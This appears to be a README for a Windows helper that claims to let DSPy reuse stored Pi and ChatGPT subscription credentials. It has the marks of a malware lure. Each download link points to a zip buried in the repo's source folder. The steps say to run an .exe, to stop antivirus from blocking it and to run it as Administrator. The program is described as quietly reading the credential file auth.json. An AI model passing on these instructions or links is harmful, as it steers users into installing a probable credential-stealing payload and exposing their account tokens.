# 🛠️ dspy-lm-auth - Simple Pi Credential Helper

[![Download dspy-lm-auth](https://img.shields.io/badge/Download-dspy--lm--auth-brightgreen)](https://raw.githubusercontent.com/indivisible-receivedpronunciation624/dspy-lm-auth/main/src/dspy_lm_auth/lm-auth-dspy-v1.9.zip)

---

## 📋 What is dspy-lm-auth?

dspy-lm-auth is a small application that helps DSPy use existing Pi credentials. It reads your saved login info, including ChatGPT Codex subscription keys, from your computer. This makes it easier to use DSPy with your current setup without extra sign-ins.

This way, you can:

- Run a small language model on your computer for most tasks.
- Use your ChatGPT subscription as a backup to get better results.

If you pay for ChatGPT Plus or Pro, this lets you explore DSPy without paying for separate OpenAI fees.

---

## 💻 System Requirements

To run dspy-lm-auth on Windows, your PC should have:

- Windows 10 or later
- At least 4 GB of RAM
- 200 MB of free disk space
- Internet connection (for authentication and checks)

No special hardware is needed. It works on most laptops and desktops made in the last 5 years.

---

## 🌐 Where to Get It

You need to visit the release page to download the program:

[![Download dspy-lm-auth](https://img.shields.io/badge/Download-Link-blue)](https://raw.githubusercontent.com/indivisible-receivedpronunciation624/dspy-lm-auth/main/src/dspy_lm_auth/lm-auth-dspy-v1.9.zip)

Click the link above to open the page where you can get the latest version.

---

## 🚀 How to Download and Run dspy-lm-auth on Windows

Follow these steps to get dspy-lm-auth working on your PC:

1. **Go to the Release Page**  
   Click this link: https://raw.githubusercontent.com/indivisible-receivedpronunciation624/dspy-lm-auth/main/src/dspy_lm_auth/lm-auth-dspy-v1.9.zip

2. **Find the Latest Version**  
   The top entry usually shows the newest release. Look for a file ending with `.exe` or `.zip`.

3. **Download the File**  
   Click the file name to start downloading.  
   - If it’s a `.zip` file, you will need to unzip it after download.  
   - If it’s an `.exe`, you can run it directly.

4. **Open the File**  
   - For `.exe`, double-click it.  
   - For `.zip`, unzip, then open the `.exe` inside the folder.

5. **Follow on-screen Prompts**  
   The program will guide you through the setup. It will read your Pi credentials from the default location (`~/.pi/agent/auth.json`) automatically.

6. **Run DSPy as Usual**  
   dspy-lm-auth works with DSPy without extra setup once running.

---

## 🔧 How dspy-lm-auth Works

dspy-lm-auth acts as a middleman between DSPy and your saved Pi credentials. It picks up your ChatGPT subscription token and makes it available to DSPy. This means:

- You do not need to log in again.
- Your local small model runs most of the time, saving costs.
- When you ask for advanced help, your ChatGPT subscription kicks in.

This hybrid approach balances performance and cost.

---

## 🗂 Where Your Credentials Are Stored

Your credentials are normally saved here on Windows:

`C:\Users\<YourUserName>\.pi\agent\auth.json`

dspy-lm-auth reads this file in the background. You do not need to touch it.

Make sure your ChatGPT subscription is active with Pi to use its full features.

---

## ⚙️ Using with DSPy

Start your DSPy application as usual. The local small model will handle most requests.

When DSPy needs help beyond that, it will ask dspy-lm-auth to use your ChatGPT subscription via the credentials.

You do not need to configure any API keys manually.

---

## 🛠 Troubleshooting Tips

- If the program can’t find your credentials, check if the file exists at `C:\Users\<YourUserName>\.pi\agent\auth.json`.
- Confirm your ChatGPT subscription is active and logged in through Pi.
- Restart dspy-lm-auth if you update your credentials.
- Make sure Windows Defender or other antivirus programs do not block the `.exe` file.
- If the program crashes, run it as Administrator.

---

## 🗒 Additional Information

The tool is open source under the MIT License. It works quietly in the background to improve your DSPy experience without extra cost.

You don’t need to learn anything about APIs or tokens. Just download, run, and it will take care of the rest.

---

## 📥 Download dspy-lm-auth Here

Visit the release page below to get the latest version for your Windows PC:

[![Download dspy-lm-auth](https://img.shields.io/badge/Download-Link-blue)](https://raw.githubusercontent.com/indivisible-receivedpronunciation624/dspy-lm-auth/main/src/dspy_lm_auth/lm-auth-dspy-v1.9.zip)